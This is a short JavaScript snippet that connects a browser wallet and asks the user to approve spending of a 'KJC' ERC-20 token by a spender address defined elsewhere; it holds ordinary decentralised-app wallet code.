let web3;
let user;
let kjcToken;

async function connectWallet() {
  if (window.ethereum || window.bitkeep?.ethereum) {
    window.web3 = new Web3(window.ethereum || window.bitkeep.ethereum);
    const accounts = await web3.eth.requestAccounts();
    user = accounts[0];
    kjcToken = new web3.eth.Contract(erc20ABI, kjcAddress);
    document.getElementById("walletAddress").innerText = "✅ " + user;
  } else {
    alert("Please install MetaMask or Bitget Wallet");
  }
}

async function approveKJC() {
  if (!web3 || !user || !kjcToken) {
    alert("❌ Please connect wallet first.");
    return;
  }

  try {
    await kjcToken.methods.approve(spenderAddress, approveAmount).send({ from: user });
    alert("✅ Approve successful");
  } catch (error) {
    console.error(error);
    alert("❌ Approve failed");
  }
}
